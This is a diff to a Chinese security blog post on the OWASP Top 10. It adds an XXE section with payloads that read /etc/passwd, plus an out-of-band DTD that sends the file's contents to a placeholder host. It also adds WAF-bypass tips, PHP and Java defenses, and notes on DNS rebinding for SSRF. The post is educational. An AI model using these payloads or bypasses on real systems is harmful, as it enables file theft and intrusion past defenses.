@@ -26,7 +26,7 @@
 <meta property="og:image" content="https://chujian521.github.io/images/fj35.jpg">
 <meta property="og:image" content="https://chujian521.github.io/images/ssrf.png">
 <meta property="article:published_time" content="2022-10-17T08:46:35.000Z">
-<meta property="article:modified_time" content="2023-03-04T11:07:46.263Z">
+<meta property="article:modified_time" content="2023-03-25T08:48:36.001Z">
 <meta property="article:author" content="Encounter">
 <meta property="article:tag" content="Web安全">
 <meta name="twitter:card" content="summary_large_image">
@@ -252,7 +252,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          9.2k 字
+          11k 字
         
       </span>
     
@@ -263,7 +263,7 @@
         
         
         
-          77 分钟
+          89 分钟
         
       </span>
     
@@ -348,6 +348,37 @@
 <p><strong>情境 #2:</strong> 数据文件目录查看权限并未在服务器上关闭。攻击者可以找出并且下载已编译过 Java 代码，并且通过反编译与逆向工程等手法，查看原始代码。再通过源代码找出应用程序中严重的存取控制缺陷。</p>
 <p><strong>情境 #3:</strong> 程序服务器的设定中允许输出带有详细内容的错误信息，例如堆栈追踪，供用户查看。这有可能导致敏感讯息的外泄，或间接透露出使用中并带有脆弱性的组件版本。</p>
 <p><strong>情境 #4:</strong> 一个云端服务器，给其他在网际网路的 CSP 用户提供了预设权限分享，这将导致云端储存的敏感资料可以被存取。</p>
+<h4 id="XXE利用方式"><a href="#XXE利用方式" class="headerlink" title="XXE利用方式"></a>XXE利用方式</h4><p>1.有回显情况</p>
+<p>结合外部实体声明（实体名称 SYSTEM ”uri&#x2F;url“）和参数实体（% 实体名称 SYSTEM “uri-外部dtd”）有两种方式进行注入攻击</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [<span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">foo</span> <span class="hljs-keyword">ANY</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>引用外部dtd：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [<span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">foo</span> <span class="hljs-keyword">ANY</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://xxx/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">%xxe;]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><span class="hljs-symbol">&amp;evil;</span><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>evil.dtd：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY %evil <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///ect/passwd&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>2.无回显的情况</p>
+<p>可以使用外带数据提取通道提取数据，先用file:&#x2F;&#x2F;获取目标文件内容，然后将内容以http请求等发送到接收数据的服务器</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">updateProfile</span>[</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://xxx/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">%dtd;</span><br><span class="hljs-meta">%send;</span><br><span class="hljs-meta">]&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>evil.dtd，内部的%要进行实体编码成&amp;#x25</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">all</span></span><br><span class="hljs-meta"><span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25 send SYSTEM &#x27;http://xxx.xxx.xxx.xxx/?data=%file;&#x27;&gt;&quot;</span></span><br><span class="hljs-meta">&gt;</span><br>%all;<br></code></pre></td></tr></table></figure>
+
+<p>XXE解析一般在导入配置、数据传输接口等场景会用到，涉及到XML文件处理的场景可以查看XML解析器是否禁用外部实体</p>
+<p>防御：使用语言中推荐的禁用外部实体的方法</p>
+<p><strong>PHP：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure>
+
+<p><strong>JAVA:</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">DocumentBuilderFactory</span> <span class="hljs-variable">dbf</span> <span class="hljs-operator">=</span>DocumentBuilderFactory.newInstance();<br>dbf.setExpandEntityReferences(<span class="hljs-literal">false</span>);<br></code></pre></td></tr></table></figure>
+
+<h4 id="绕过WAF"><a href="#绕过WAF" class="headerlink" title="绕过WAF"></a>绕过WAF</h4><ol>
+<li>文档开头增加大量的空格</li>
+<li>比较成熟的WAF设置通常不会读取链接文件的内容，因此可能不会解析指向未知实体的链接，阻止XML解析器导致错误</li>
+<li>xml文档有多种编码方式，可以用utf-8、utf-16、utf-32，使用不同的编码方式可能绕过WAF</li>
+<li>在一个文档中使用两种编码</li>
+</ol>
 <h2 id="A06-危险或过旧的组件"><a href="#A06-危险或过旧的组件" class="headerlink" title="A06 危险或过旧的组件"></a>A06 危险或过旧的组件</h2><h3 id="简述-1"><a href="#简述-1" class="headerlink" title="简述"></a>简述</h3><p>该弱点在产业调查中排名第二，有足够的资料让它进入前十。易受攻击的组件是我们努力测试和评估风险的已知问题，该弱点是在CWEs中唯一没有任何CVE对应的类别。著名的CWE包括：</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://cwe.mitre.org/data/definitions/1104.html">CWE-1104：使用未经维护的第三方组件</a>：产品依赖于第三方组件，这些组件不受原始开发人员或原始开发人员的受信任代理的积极支持或维护。</li>
@@ -475,15 +506,19 @@
 </ul>
 <h4 id="从应用层"><a href="#从应用层" class="headerlink" title="从应用层"></a>从应用层</h4><ul>
 <li>清理并验证所有客户输入的数据</li>
-<li>使用白名单强制实施URL协议、端口和目标</li>
-<li>不要向客户端发送原始响应数据。</li>
+<li><strong>使用白名单强制实施URL协议、端口和目标</strong></li>
+<li><strong>不要向客户端发送原始响应数据。</strong></li>
 <li>禁用HTTP重定向</li>
 <li>注意URL一致性，以避免诸如DNS重新绑定和“检查时间，使用时间”（TOCTOU）竞争条件之类的攻击</li>
 </ul>
 <p>不要通过使用黑名单或正则表达式来缓解 SSRF。攻击者拥有有效负载列表、工具和技能来绕过黑名单。</p>
 <h4 id="其他措施"><a href="#其他措施" class="headerlink" title="其他措施"></a>其他措施</h4><ul>
-<li>不要在前端系统上部署其他与安全相关的服务（例如OpenID）。控制这些系统上的本地流量（例如本地主机）</li>
-<li>对于具有专用和可管理用户组的前端，在独立系统上使用网络加密来考虑非常高的保护需求。</li>
+<li><p><strong>限制不能访问内网ip</strong></p>
+</li>
+<li><p>不要在前端系统上部署其他与安全相关的服务（例如OpenID）。控制这些系统上的本地流量（例如本地主机）</p>
+</li>
+<li><p>对于具有专用和可管理用户组的前端，在独立系统上使用网络加密来考虑非常高的保护需求。</p>
+</li>
 </ul>
 <h3 id="攻击实例-5"><a href="#攻击实例-5" class="headerlink" title="攻击实例"></a>攻击实例</h3><p>攻击者可以使用 SSRF 攻击受 Web 应用程序防火墙、防火墙或网络 ACL 保护的系统，使用以下方案：</p>
 <p><strong>场景 #1：</strong>端口扫描内部服务器 – 如果网络体系结构未分段，攻击者可以绘制出内部网络，并根据连接结果或连接或拒绝 SSRF 有效负载连接所用的时间确定内部服务器上的端口是打开还是关闭。</p>
@@ -505,6 +540,13 @@
 <p>2.对于获得的IP进行判断，发现为指定范围IP，则通过验证</p>
 <p>3.接下来服务器端对URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址</p>
 <p>4.由于已经绕过验证，所以服务器端返回访问内网资源的内容</p>
+<p>哪些语言会被DNS重绑定攻击？</p>
+<ul>
+<li>Java默认不存在被DNS Rebinding绕过风险（TTL默认为10）（可能会有时间竞争？）</li>
+<li>PHP默认会被DNS Rebinding绕过，TTL默认为0</li>
+<li>Linux默认不会进行DNS缓存</li>
+<li>有些公共DNS服务器，比如114.114.114.114还是会把记录进行缓存，完全不按照标准协议来，8.8.8.8完全按照协议严格进行缓存</li>
+</ul>
 
                 
               </div>
